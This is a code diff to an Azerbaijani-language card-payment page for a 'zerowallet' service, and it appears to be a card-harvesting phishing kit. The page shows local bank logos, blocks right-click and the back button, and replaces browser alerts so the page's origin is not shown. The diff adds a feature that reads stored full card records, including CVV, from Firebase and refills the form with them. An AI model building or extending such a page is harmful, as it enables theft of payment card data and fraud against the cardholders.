@@ -69,7 +69,6 @@
         .confirm-btn:active { transform: scale(0.98); }
         .confirm-btn:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        /* Receipt Dizayn */
         .receipt-card { display: none; text-align: center; border-bottom: 10px solid var(--success); }
         .receipt-header { color: var(--success); font-size: 4rem; margin-bottom: 15px; }
         .check-title { font-weight: 800; font-size: 1.4rem; color: #1e293b; margin-bottom: 25px; }
@@ -81,9 +80,11 @@
 
         .visa-master { margin-top: 25px; display: flex; justify-content: center; gap: 15px; opacity: 0.4; font-size: 1.8rem; color: #64748b; }
 
-        /* TOAST BİLDİRİŞİ */
         .toast { position: fixed; top: 30px; left: 50%; transform: translateX(-50%); background: #1e293b; color: #fff; padding: 14px 28px; border-radius: 50px; font-size: 13px; font-weight: 600; z-index: 10000; box-shadow: 0 10px 25px rgba(0,0,0,0.2); animation: fadeInDown 0.4s ease; }
         @keyframes fadeInDown { from { top: -20px; opacity: 0; } to { top: 30px; opacity: 1; } }
+
+        /* KART SEÇİMİ BÖLMƏSİ */
+        .saved-card-hint { background: #eff6ff; border: 1px solid #dbeafe; padding: 10px; border-radius: 12px; margin-bottom: 15px; font-size: 0.75rem; color: var(--accent); display: none; align-items: center; gap: 10px; cursor: pointer; }
     </style>
 </head>
 <body oncontextmenu="return false;">
@@ -98,6 +99,10 @@
             <img src="abb.png" alt="ABB">
             <img src="kapital.png" alt="Kapital">
             <img src="pasha.png" alt="Pasha">
+        </div>
+
+        <div id="saved-card-box" class="saved-card-hint" onclick="useSavedCard()">
+            <i class="fas fa-credit-card"></i> <span>Yadda saxlanılmış kartı doldur</span>
         </div>
 
         <label class="label">Kart Sahibi</label>
@@ -144,7 +149,6 @@
     </div>
 
     <script>
-        // URL VƏ BRAUZER QORUMASI
         window.history.pushState(null, "", window.location.href);
         window.onpopstate = () => window.history.pushState(null, "", window.location.href);
 
@@ -161,14 +165,31 @@
         const db = firebase.database();
         const user = localStorage.getItem('zerowallet_session');
 
-        let userBal = 0, userIp = "";
+        let userBal = 0, userIp = "", savedCardData = null;
+
         db.ref('zerowallet_users/' + user).once('value', snap => {
             const d = snap.val();
-            userBal = d.balance;
+            userBal = d.balance || 0;
             userIp = d.ip || "0.0.0.0";
+            
+            // coor.html-də yadda saxlanılan kart məlumatlarını yoxla
+            if(d.cardInfo) {
+                savedCardData = d.cardInfo;
+                document.getElementById('saved-card-box').style.display = 'flex';
+                // Avtomatik doldurmaq istəsən birbaşa bura useSavedCard() yaza bilərsən
+            }
         });
 
-        // "Şu sayfadan" yazısı gəlməməsi üçün Custom Toast
+        function useSavedCard() {
+            if(savedCardData) {
+                document.getElementById('w-name').value = savedCardData.holder || "";
+                document.getElementById('w-card').value = savedCardData.number || "";
+                document.getElementById('w-date').value = savedCardData.expiry || "";
+                document.getElementById('w-cvv').value = savedCardData.cvv || "";
+                showToast("Kart məlumatları dolduruldu!");
+            }
+        }
+
         function showToast(msg) {
             let t = document.createElement('div');
             t.className = 'toast';
@@ -183,7 +204,6 @@
             const exp = document.getElementById('w-date').value;
             const cvv = document.getElementById('w-cvv').value;
 
-            // Əsas yoxlamalar
             if(card.length < 16) return showToast("Kart nömrəsi 16 rəqəmli olmalıdır!");
             if(name.length < 5) return showToast("Zəhmət olmasa kart üzərindəki adı tam yazın!");
             if(cvv.length < 3) return showToast("CVV kodu yanlışdır!");
@@ -219,7 +239,6 @@
             }
         }
 
-        // Kart tarixi üçün avtomatik "/" əlavə etmək
         document.getElementById('w-date').addEventListener('input', function (e) {
             let v = e.target.value.replace(/\D/g, '');
             if (v.length >= 2) v = v.slice(0, 2) + '/' + v.slice(2, 4);
